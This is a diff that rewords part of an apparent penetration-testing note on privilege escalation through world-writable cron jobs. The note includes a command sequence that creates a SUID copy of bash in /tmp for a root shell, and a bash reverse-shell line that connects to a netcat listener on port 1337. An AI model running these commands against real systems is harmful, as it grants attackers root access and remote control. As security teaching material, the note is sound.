@@ -1,19 +1,19 @@
 If a cronjob is globally writeable, an underprivileged user can edit the contents to run 
-malicious code. For example, you can spawn a root shell with a few steps:
+malicious code. Since the cron job is executed with the permissions of its owner (often root), 
+any inserted code will run with elevated privileges.
 
-- Edit the cronjob to copy the `/bin/bash/` directory into the `/tmp` directory as a binary 
-  named `rootbash`
+- Edit the cronjob to copy the `/bin/bash/` binary into the `/tmp` directory named `rootbash`
     cp /bin/bash /tmp/rootbash
     chmod +xs /tmp/rootbash
 
   Executing the rootbash binary with the -p option (/tmp/rootbash -p) will spawn a shell, with 
-  persisting privileged permisions (root shell)
+  persisting privileged permisions (in this case, root)
 
 - Edit the cronjob with a reverse shell to connect back to a netcat listener
     bash -i >& /dev/tcp/<local_ip>/1337 0>&1
 
   Host a netcat listener on your local machine. Once the cronjob runs, the victim machine will 
-  connect to your listener, as a root shell since the cronjob is running as root
+  connect to your listener, with a mirrored privileged shell (in this case, root)
 
 ## Step one is to check if crontabs are exploitable ##
 
